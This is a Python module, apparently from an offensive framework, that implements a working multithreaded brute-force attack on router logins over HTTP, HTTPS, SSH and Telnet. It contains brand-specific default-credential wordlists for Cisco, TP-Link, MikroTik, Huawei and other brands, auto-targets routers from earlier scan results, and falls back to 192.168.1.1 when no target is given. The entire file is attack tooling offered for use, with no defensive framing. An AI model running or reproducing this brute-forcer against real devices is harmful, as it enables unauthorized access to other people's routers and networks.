#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Router Brute Force OOP",
    "description": "Advanced router authentication brute force with TQDM-style progress and router brand targeting",
    "author": "Lazy Framework", 
    "license": "MIT",
    "dependencies": ["requests", "paramiko", "urllib3"],
    "platform": "Multi",
    "rank": "Normal",
}

OPTIONS = {
    "target": {
        "description": "Target router IP address (or 'auto' to use discovered routers)",
        "required": True,
        "default": "auto"
    },
    "port": {
        "description": "Target port",
        "required": False,
        "default": "80"
    },
    "protocol": {
        "description": "Protocol to attack (http, https, ssh, telnet, auto)",
        "required": False,
        "default": "auto"
    },
    "username_list": {
        "description": "Username wordlist file path",
        "required": False,
        "default": "wordlists/router_usernames.txt"
    },
    "password_list": {
        "description": "Password wordlist file path", 
        "required": False,
        "default": "wordlists/router_passwords.txt"
    },
    "brand": {
        "description": "Router brand for targeted wordlists (auto, cisco, tplink, mikrotik, etc)",
        "required": False,
        "default": "auto"
    },
    "threads": {
        "description": "Number of concurrent threads",
        "required": False,
        "default": "10"
    },
    "timeout": {
        "description": "Request timeout in seconds",
        "required": False,
        "default": "3"
    }
}

class RouterBruteForce:
    """Advanced router brute force engine with OOP design and TQDM-style progress"""
    
    BRAND_WORDLISTS = {
        "cisco": {
            "usernames": ["admin", "cisco", "root", "enable", "operator"],
            "passwords": ["cisco", "admin", "default", "password", "Cisco", "Admin", "enable", "operator"]
        },
        "tplink": {
            "usernames": ["admin", "root", "user", "support"],
            "passwords": ["admin", "password", "1234", "12345", "123456", "admin123", "default"]
        },
        "mikrotik": {
            "usernames": ["admin", "mikrotik", "root", "user"],
            "passwords": ["admin", "password", "1234", "mikrotik", "default", ""]
        },
        "dlink": {
            "usernames": ["admin", "user", "root"],
            "passwords": ["admin", "password", "default", "1234", ""]
        },
        "netgear": {
            "usernames": ["admin", "root"],
            "passwords": ["password", "admin", "1234", "default"]
        },
        "asus": {
            "usernames": ["admin", "root", "asus"],
            "passwords": ["admin", "password", "asus", "1234", "default"]
        },
        "linksys": {
            "usernames": ["admin", "root"],
            "passwords": ["admin", "password", "linksys", "default"]
        },
        "huawei": {
            "usernames": ["admin", "root", "telecomadmin"],
            "passwords": ["admin", "admintelecom", "password", "default", "1234"]
        },
        "zyxel": {
            "usernames": ["admin", "root"],
            "passwords": ["1234", "admin", "password", "default"]
        },
        "ubiquiti": {
            "usernames": ["ubnt", "admin", "root"],
            "passwords": ["ubnt", "admin", "password", "default"]
        }
    }
    
    PROTOCOL_PORTS = {
        "http": 80,
        "https": 443,
        "ssh": 22,
        "telnet": 23
    }
    
    def __init__(self, console, target="auto", port=80, protocol="auto", username_file="", password_file="", brand="auto", max_threads=10, timeout=3):
        self.console = console
        self.target = target
        self.port = port
        self.protocol = protocol
        self.username_file = username_file
        self.password_file = password_file
        self.brand = brand
        self.max_threads = max_threads
        self.timeout = timeout
        
        self.credentials_found = []
        self.attack_stats = {
            'total_combinations': 0,
            'attempts': 0,
            'valid_credentials': 0,
            'errors': 0,
            'start_time': 0,
            'end_time': 0,
            'current_speed': 0
        }
        
        # Protocol handlers
        self.protocol_handlers = {
            'http': self._http_brute_force,
            'https': self._https_brute_force,
            'ssh': self._ssh_brute_force,
            'telnet': self._telnet_brute_force
        }
    
    def auto_discover_targets(self):
        """Automatically discover routers from previous scan results"""
        import json
        import os
        
        discovered_routers = []
        
        try:
            # Check for scan results file
            scan_file = "scan_results.json"
            if os.path.exists(scan_file):
                with open(scan_file, 'r') as f:
                    scan_data = json.load(f)
                
                for host in scan_data.get('discovered_hosts', []):
                    if host.get('is_router', False):
                        discovered_routers.append({
                            'ip': host['ip'],
                            'brand': host.get('router_brand', 'Unknown'),
                            'open_ports': host.get('open_ports', [])
                        })
            
            return discovered_routers
            
        except Exception as e:
            self.console.print(f"[yellow]Auto-discovery warning: {e}[/yellow]")
            return []
    
    def detect_protocol(self, target_ip, target_port):
        """Auto-detect the best protocol to use"""
        import socket
        
        # Check common router protocols
        protocols_to_check = [
            ('http', 80), ('https', 443), ('ssh', 22), ('telnet', 23)
        ]
        
        for proto, port in protocols_to_check:
            if target_port == port or target_port == self.port:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((target_ip, port))
                    sock.close()
                    
                    if result == 0:
                        return proto
                except:
                    continue
        
        return "http"  # Default fallback
    
    def load_wordlists(self, brand="auto"):
        """Load username and password wordlists with brand targeting"""
        import os
        
        # Create wordlist directory if needed
        os.makedirs("wordlists", exist_ok=True)
        
        # Use brand-specific wordlists if available
        if brand != "auto" and brand.lower() in self.BRAND_WORDLISTS:
            brand_data = self.BRAND_WORDLISTS[brand.lower()]
            usernames = brand_data["usernames"]
            passwords = brand_data["passwords"]
            self.console.print(f"[green]Using {brand}-specific wordlists: {len(usernames)} users, {len(passwords)} passwords[/green]")
        else:
            # Load from files or create defaults
            usernames, passwords = self._load_wordlists_from_files()
        
        self.attack_stats['total_combinations'] = len(usernames) * len(passwords)
        return usernames, passwords
    
    def _load_wordlists_from_files(self):
        """Load wordlists from files or create default ones"""
        import os
        
        # Default comprehensive wordlists
        default_usernames = [
            "admin", "root", "user", "administrator", "support", 
            "guest", "default", "operator", "supervisor", "tech",
            "cisco", "ubnt", "mikrotik", "admin1", "Admin", "enable",
            "telecomadmin", "cusadmin", "firewall", "security"
        ]
        
        default_passwords = [
            "admin", "password", "1234", "12345", "123456", 
            "12345678", "123456789", "password1", "admin123",
            "root", "default", "pass", "guest", "0000", "1111",
            "123", "cisco", "ubnt", "mikrotik", "admin1234",
            "P@ssw0rd", "Password", "Admin", "", "changeme",
            "default", "1234", "12345", "password123"
        ]
        
        # Try to load from files
        usernames = default_usernames
        passwords = default_passwords
        
        if self.username_file and os.path.exists(self.username_file):
            try:
                with open(self.username_file, 'r', encoding='utf-8', errors='ignore') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.console.print(f"[yellow]Error loading username file: {e}[/yellow]")
        
        if self.password_file and os.path.exists(self.password_file):
            try:
                with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.console.print(f"[yellow]Error loading password file: {e}[/yellow]")
        
        # Create default files if they don't exist
        if not os.path.exists("wordlists/router_usernames.txt"):
            with open("wordlists/router_usernames.txt", 'w') as f:
                for username in default_usernames:
                    f.write(f"{username}\n")
        
        if not os.path.exists("wordlists/router_passwords.txt"):
            with open("wordlists/router_passwords.txt", 'w') as f:
                for password in default_passwords:
                    f.write(f"{password}\n")
        
        return usernames, passwords
    
    def validate_target(self, target_ip, target_port):
        """Validate target connectivity before attack"""
        import socket
        
        try:
            socket.setdefaulttimeout(self.timeout)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((target_ip, target_port))
            sock.close()
            
            if result == 0:
                return True
            else:
                self.console.print(f"[red]Target {target_ip}:{target_port} is not reachable[/red]")
                return False
        except Exception as e:
            self.console.print(f"[red]Target validation error: {e}[/red]")
            return False
    
    def execute_single_attack(self, target_ip, target_port, protocol, brand="auto"):
        """Execute brute force attack against a single target"""
        import threading
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from rich.progress import (
            Progress, SpinnerColumn, TextColumn, BarColumn, 
            TaskProgressColumn, TimeRemainingColumn, MofNCompleteColumn
        )
        import time
        
        # Load wordlists
        usernames, passwords = self.load_wordlists(brand)
        
        if not usernames or not passwords:
            self.console.print("[red]No wordlists available for attack[/red]")
            return
        
        # Auto-detect protocol if needed
        if protocol == "auto":
            protocol = self.detect_protocol(target_ip, target_port)
            self.console.print(f"[yellow]Auto-detected protocol: {protocol}[/yellow]")
        
        # Validate target
        if not self.validate_target(target_ip, target_port):
            return
        
        # Initialize attack
        self.attack_stats['start_time'] = time.time()
        lock = threading.Lock()
        stop_event = threading.Event()
        
        # Enhanced progress setup with TQDM style
        progress = Progress(
            SpinnerColumn("dots"),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            MofNCompleteColumn(),
            TextColumn("•"),
            TaskProgressColumn(),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=self.console,
            expand=True
        )
        
        def attempt_credentials(username, password):
            """Attempt single credential combination"""
            if stop_event.is_set():
                return None
                
            try:
                handler = self.protocol_handlers.get(protocol)
                if not handler:
                    return None
                
                success, message = handler(target_ip, target_port, username, password)
                
                with lock:
                    self.attack_stats['attempts'] += 1
                    
                    # Calculate current speed
                    elapsed = time.time() - self.attack_stats['start_time']
                    if elapsed > 0:
                        self.attack_stats['current_speed'] = self.attack_stats['attempts'] / elapsed
                    
                    if success:
                        self.attack_stats['valid_credentials'] += 1
                        credential_data = {
                            'username': username,
                            'password': password,
                            'protocol': protocol,
                            'target': f"{target_ip}:{target_port}",
                            'brand': brand
                        }
                        self.credentials_found.append(credential_data)
                        stop_event.set()  # Stop other threads
                        return credential_data
                
                return None
                    
            except Exception as e:
                with lock:
                    self.attack_stats['errors'] += 1
                return None
        
        with progress:
            main_task = progress.add_task(
                f"[red]Attacking {target_ip}:{target_port} ({protocol.upper()})...", 
                total=len(usernames) * len(passwords)
            )
            
            # Execute attack with thread pool
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                # Submit all combinations
                futures = []
                for username in usernames:
                    for password in passwords:
                        if stop_event.is_set():
                            break
                        future = executor.submit(attempt_credentials, username, password)
                        futures.append(future)
                    
                    if stop_event.is_set():
                        break
                
                # Monitor completion
                completed = 0
                for future in as_completed(futures):
                    completed += 1
                    progress.update(main_task, completed=completed)
                    
                    # Update description with current stats
                    progress.update(
                        main_task,
                        description=f"[red]Attacking {target_ip}... [{completed}/{len(usernames)*len(passwords)}] • {self.attack_stats['current_speed']:.1f}/s • {self.attack_stats['valid_credentials']} found"
                    )
                    
                    result = future.result()
                    if result:  # Credentials found
                        break
                    
                    if stop_event.is_set():
                        break
        
        self.attack_stats['end_time'] = time.time()
    
    def execute_multi_attack(self, targets):
        """Execute brute force attack against multiple targets"""
        from rich.progress import (
            Progress, SpinnerColumn, TextColumn, BarColumn, 
            TaskProgressColumn, TimeRemainingColumn, MofNCompleteColumn
        )
        
        if not targets:
            self.console.print("[red]No targets specified for attack[/red]")
            return
        
        self.console.print(f"[green]Starting multi-target attack on {len(targets)} routers[/green]")
        
        with Progress(
            SpinnerColumn("dots"),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40),
            MofNCompleteColumn(),
            TextColumn("•"),
            TaskProgressColumn(),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=self.console,
            expand=True
        ) as progress:
            
            main_task = progress.add_task(
                f"[red]Multi-target attack...", 
                total=len(targets)
            )
            
            for i, target in enumerate(targets):
                target_ip = target['ip']
                target_brand = target.get('brand', 'auto')
                target_ports = target.get('open_ports', [])
                
                # Determine port and protocol
                target_port = self.port
                protocol = self.protocol
                
                if target_ports:
                    # Use the first open port that matches common protocols
                    for port_info in target_ports:
                        port = port_info['port']
                        if port in [80, 443, 22, 23]:
                            target_port = port
                            if port == 80: protocol = "http"
                            elif port == 443: protocol = "https" 
                            elif port == 22: protocol = "ssh"
                            elif port == 23: protocol = "telnet"
                            break
                
                progress.update(
                    main_task,
                    description=f"[red]Attacking {target_ip} ({i+1}/{len(targets)}) • {len(self.credentials_found)} found"
                )
                
                self.execute_single_attack(target_ip, target_port, protocol, target_brand)
                progress.advance(main_task)
                
                # Stop if we found credentials and want to be conservative
                if self.credentials_found:
                    break
    
    def _http_brute_force(self, target_ip, target_port, username, password):
        """HTTP form brute force implementation"""
        import requests
        
        try:
            session = requests.Session()
            session.timeout = self.timeout
            
            # Common router login endpoints
            endpoints = ['/', '/login', '/admin', '/router', '/config', '/cgi-bin/login.cgi']
            
            for endpoint in endpoints:
                url = f"http://{target_ip}:{target_port}{endpoint}"
                
                # Common form field names
                form_variations = [
                    {'username': username, 'password': password},
                    {'user': username, 'pass': password},
                    {'login': username, 'password': password},
                    {'uname': username, 'pwd': password},
                    {'admin_username': username, 'admin_password': password}
                ]
                
                for form_data in form_variations:
                    try:
                        response = session.post(url, data=form_data, allow_redirects=False)
                        
                        # Check for success indicators
                        if response.status_code in [200, 302, 301]:
                            response_text = response.text.lower()
                            
                            # Success indicators
                            success_indicators = ['logout', 'welcome', 'dashboard', 'status', 'main.html']
                            failure_indicators = ['invalid', 'error', 'incorrect', 'login failed']
                            
                            if any(indicator in response_text for indicator in success_indicators):
                                if not any(indicator in response_text for indicator in failure_indicators):
                                    return True, ""
                            
                            # Check for redirect to non-login page
                            if response.status_code in [302, 301]:
                                location = response.headers.get('location', '').lower()
                                if 'login' not in location and 'auth' not in location:
                                    return True, ""
                    
                    except:
                        continue
            
            return False, "Authentication failed"
            
        except Exception as e:
            return False, f"HTTP error: {e}"
    
    def _https_brute_force(self, target_ip, target_port, username, password):
        """HTTPS form brute force implementation"""
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        try:
            session = requests.Session()
            session.timeout = self.timeout
            session.verify = False  # Disable SSL verification
            
            endpoints = ['/', '/login', '/admin', '/router']
            
            for endpoint in endpoints:
                url = f"https://{target_ip}:{target_port}{endpoint}"
                
                form_variations = [
                    {'username': username, 'password': password},
                    {'user': username, 'pass': password}
                ]
                
                for form_data in form_variations:
                    try:
                        response = session.post(url, data=form_data, allow_redirects=False)
                        
                        if response.status_code in [200, 302, 301]:
                            response_text = response.text.lower()
                            
                            if any(indicator in response_text for indicator in ['logout', 'welcome', 'dashboard']):
                                if not any(indicator in response_text for indicator in ['invalid', 'error']):
                                    return True, ""
                            
                            if response.status_code in [302, 301]:
                                location = response.headers.get('location', '').lower()
                                if 'login' not in location:
                                    return True, ""
                    
                    except:
                        continue
            
            return False, "Authentication failed"
            
        except Exception as e:
            return False, f"HTTPS error: {e}"
    
    def _ssh_brute_force(self, target_ip, target_port, username, password):
        """SSH brute force implementation"""
        import paramiko
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                target_ip, 
                port=target_port, 
                username=username, 
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            # If connection successful, close it and return True
            client.close()
            return True, ""
            
        except paramiko.ssh_exception.AuthenticationException:
            return False, "Authentication failed"
        except Exception as e:
            return False, f"SSH error: {e}"
    
    def _telnet_brute_force(self, target_ip, target_port, username, password):
        """Telnet brute force implementation"""
        import telnetlib
        
        try:
            tn = telnetlib.Telnet(target_ip, target_port, timeout=self.timeout)
            
            # Wait for login prompt (common patterns)
            login_patterns = [b"login:", b"username:", b"user:"]
            idx, match, text = tn.expect(login_patterns, timeout=self.timeout)
            if idx >= 0:
                tn.write(username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            password_patterns = [b"password:", b"pass:"]
            idx, match, text = tn.expect(password_patterns, timeout=self.timeout)
            if idx >= 0:
                tn.write(password.encode('ascii') + b"\n")
            
            # Check result
            result = tn.read_until(b"#", timeout=2)
            tn.close()
            
            if (b"incorrect" not in result.lower() and 
                b"error" not in result.lower() and 
                b"fail" not in result.lower()):
                return True, ""
            else:
                return False, "Login failed"
                
        except Exception as e:
            return False, f"Telnet error: {e}"
    
    def display_results(self):
        """Display attack results in rich format"""
        from rich.panel import Panel
        from rich.table import Table
        
        elapsed_time = self.attack_stats['end_time'] - self.attack_stats['start_time']
        
        # Display found credentials
        if self.credentials_found:
            for creds in self.credentials_found:
                self.console.print(Panel.fit(
                    f"[bold green]🎉 CREDENTIALS FOUND![/bold green]\n"
                    f"Target: [cyan]{creds['target']}[/cyan]\n"
                    f"Protocol: [yellow]{creds['protocol'].upper()}[/yellow]\n"
                    f"Username: [red]{creds['username']}[/red]\n"
                    f"Password: [magenta]{creds['password']}[/magenta]\n"
                    f"Brand: [white]{creds.get('brand', 'Unknown')}[/white]",
                    border_style="green"
                ))
        else:
            self.console.print(Panel.fit(
                "[bold red]❌ No valid credentials found[/bold red]",
                border_style="red"
            ))
        
        # Display statistics
        success_rate = (self.attack_stats['valid_credentials'] / self.attack_stats['attempts'] * 100) if self.attack_stats['attempts'] > 0 else 0
        avg_speed = self.attack_stats['attempts'] / elapsed_time if elapsed_time > 0 else 0
        
        stats_text = (
            f"[bold]📊 Attack Statistics[/bold]\n"
            f"Attempts: [cyan]{self.attack_stats['attempts']}/{self.attack_stats['total_combinations']}[/cyan]\n"
            f"Success Rate: [green]{success_rate:.2f}%[/green]\n"
            f"Credentials Found: [red]{self.attack_stats['valid_credentials']}[/red]\n"
            f"Errors: [yellow]{self.attack_stats['errors']}[/yellow]\n"
            f"Average Speed: [magenta]{avg_speed:.1f} attempts/second[/magenta]\n"
            f"Total Time: [white]{elapsed_time:.1f} seconds[/white]"
        )
        
        self.console.print(Panel.fit(stats_text, border_style="blue"))

def run(session, options):
    from rich.console import Console
    from rich.panel import Panel
    
    console = Console()
    
    # Parse options
    target = options.get("target", "auto")
    port = int(options.get("port", 80))
    protocol = options.get("protocol", "auto")
    username_file = options.get("username_list", "wordlists/router_usernames.txt")
    password_file = options.get("password_list", "wordlists/router_passwords.txt")
    brand = options.get("brand", "auto")
    max_threads = int(options.get("threads", 10))
    timeout = int(options.get("timeout", 3))
    
    # Display header
    console.print(Panel.fit(
        f"[bold]🔓 Router Brute Force (OOP)[/bold]\n"
        f"Target: [cyan]{target}[/cyan]\n"
        f"Port: [yellow]{port}[/yellow]\n"
        f"Protocol: [green]{protocol}[/green]\n"
        f"Brand: [magenta]{brand}[/magenta]\n"
        f"Threads: [red]{max_threads}[/red]\n"
        f"Timeout: [white]{timeout}s[/white]",
        border_style="red"
    ))
    
    # Create brute force engine
    engine = RouterBruteForce(
        console=console,
        target=target,
        port=port,
        protocol=protocol,
        username_file=username_file,
        password_file=password_file,
        brand=brand,
        max_threads=max_threads,
        timeout=timeout
    )
    
    try:
        if target == "auto":
            # Auto-discover and attack routers
            discovered_routers = engine.auto_discover_targets()
            if discovered_routers:
                console.print(f"[green]Auto-discovered {len(discovered_routers)} routers[/green]")
                engine.execute_multi_attack(discovered_routers)
            else:
                console.print("[yellow]No routers auto-discovered. Please run router_scanner_oop first.[/yellow]")
                # Fall back to common router IP
                console.print("[yellow]Trying common router IP: 192.168.1.1[/yellow]")
                engine.execute_single_attack("192.168.1.1", port, protocol, brand)
        else:
            # Single target attack
            engine.execute_single_attack(target, port, protocol, brand)
        
        engine.display_results()
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Brute force error: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
